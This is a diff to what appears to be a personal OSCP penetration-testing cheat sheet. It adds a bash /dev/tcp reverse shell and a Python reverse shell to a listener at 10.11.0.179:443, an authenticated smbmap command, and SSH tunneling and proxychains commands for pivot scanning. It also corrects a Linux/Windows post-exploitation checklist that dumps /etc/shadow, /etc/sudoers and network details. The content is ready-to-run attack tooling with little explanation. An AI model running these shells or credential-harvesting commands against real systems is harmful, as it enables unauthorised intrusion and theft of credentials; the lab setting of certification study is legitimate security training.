@@ -213,6 +213,7 @@ SMB null session on Windows:
 net use \\[target] "" /u:""
 
 smbmap -H [targetIP]
+smbmap -H [targetIP] -u root -p [password]
 
 smbclient -L 10.10.0.1 -U [user]
 
@@ -391,7 +392,9 @@ hydra -e nsr -V -F -t 4 -u -L /root/userlist-pumpkin.txt -P /usr/share/wordlists
 
 Shells
 shell cheatsheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-/bin/bash -i >& /dev/tcp/10.11.0.73/443 0>&1
+/bin/bash -i >& /dev/tcp/10.11.0.179/443 0>&1
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.179",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 Shell breakouts: 
 (https://netsec.ws/?p=337) 
@@ -679,7 +682,7 @@ ls /Metasploit-latest/scripts/meterpreter/*    (see all, edit them for your own 
 
 
 Get a Windows GUI
-Metasploit: use post/windows/manage/enable_rdp     (enable rdp and make a new user, requires system privs) or you can do manually via cmd or powershell (below)
+Metasploit: run post/windows/manage/enable_rdp     (enable rdp and make a new user, requires system privs) or you can do manually via cmd or powershell (below)
 
 
 
@@ -896,7 +899,7 @@ OSCP post-exp checklists:
         date /t
         time/t
         hostname
-        whoa mi (or echo %usemame%)
+        whoami (or echo %username% on older systems)
         ipconfig
         dir
         type proof.txt
@@ -908,9 +911,9 @@ OSCP post-exp checklists:
         route print
         arp -a
         netstat -ano
-        t asklist /svc
+        tasklist /svc
         net start
-        net sha r,e
+        net share
         net use
 
         **Lin:
@@ -918,31 +921,30 @@ OSCP post-exp checklists:
         whoami
         id
         hostname
-        /sbin/ifoo nfig
+        /sbin/ifconfig
         pwd
-        Is -I
-        cait proof. txt
+        ls -lisha
+        cat proof.txt
         cat network-secret.txt
-        cat / etc/issue
+        cat /etc/issue
         uname -ai
-        cat / etc/p,asswd
-        cait / etc/group
-        cat/ etc/ shadow
-        cat / etc/ sudoers
-        Is -a lh /va r/mail/
-        Is -a hlR / mot/
-        Is -ah lR /home/
+        cat /etc/passwd
+        cat /etc/group
+        cat /etc/shadow
+        cat /etc/sudoers
+        ls -alh /var/mail/
+        ls -alhR /home/
         who
         w
-        llast
-        /sbin/ifoonfig ~a
-        cat / etc/network/inte rfaoes (or cat
-        / etc/sysco nfig/ network)
+        last
+        ip addr
+        /sbin/ifconfig -a
+        cat /etc/network/interfaces (or cat /etc/sysconfig/network)
         arp -e
-        /sbin/route -nee
-        psaux
-        ps -ef
-        cait / etc/services
+        /sbin/route -ne
+        ps aux
+        ps -elf
+        cat /etc/services
 
 
 
@@ -1154,6 +1156,24 @@ meterpreter > portfwd delete -l 8000 -p 80 -r 192.168.15.1 (cleanup)
 meterpreter > portfwd add -l 25000 -p 22 -r 192.168.15.2 (nc -v 127.0.0.1 25000 to connect to target)
 meterpreter > portfwd delete -l 25000 -p 22 -r 192.168.15.2 (cleanup)
 
+msfmap (nmap on your victim’s box; in meterpreter)
+
+
+SSH tunneling
+SSH port forward: ssh -L [localport]:127.0.0.1:[victim_ip]:[port_to_access_on_victim] -N -f -l [pivotbox_user]@[pivotbox_ip]  (-N is for don’t execute a remote command, -f runs ssh in the background)
+SSH dynamic forwarding: ssh -i ~/oscp/sshkeys/mykey -f -N -D 127.0.0.1:9050 root@10.11.1.35 (point your tools at 127.0.01:9050 if they support use of proxies (nmap can get tricky since it uses raw sockets for connections - limit uses to user level scans through pivot boxes))
+
+
+proxychains
+(make sure to edit /etc/proxychains.conf and define what port and kind of proxy - default is 9050 for tor. Ideally you have a dynamic ssh tunnel to pass traffic through)
+scanning through a pivot box: proxychains4 nmap --top-ports 50 -Pn -sT -n -T4 -sV 10.11.1.39 -oG 39.nmap
+web enumeration example: proxychains4 whatweb http://10.11.1.39
+
+
+possible way to speed scans up, blogpost below:
+https://www.hackwhackandsmack.com/?p=1021
+seq 1 1024 | xargs -P 50 -I{} proxychains4 nmap {} -sT -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 10.11.1.39 -oG 39.nmap
+
 
 ncat
 (on our attacking machine)   ncat -lv --broker -m2 55555
@@ -1166,14 +1186,6 @@ nc -nvlp 4444 0< fifo | nc 10.10.10.10 445 1> fifo
 port scanner on Windows cmd line (no tools):
 for /L %i in (1,1,255) do @ping -n 1 192.168.0.%i | find "Reply"
 
-
-msfmap (nmap on your victim’s box; in meterpreter)
-
-proxychains
-
-
-SSH tunneling
-SSH port forward: ssh -L [localport]:127.0.0.1:[port_to_access_on_victim] -N -f -l [victim_user] [victim_ip]  (-N is for don’t execute a remote command, -f runs ssh in the background, -l define remote user)
 
 
 
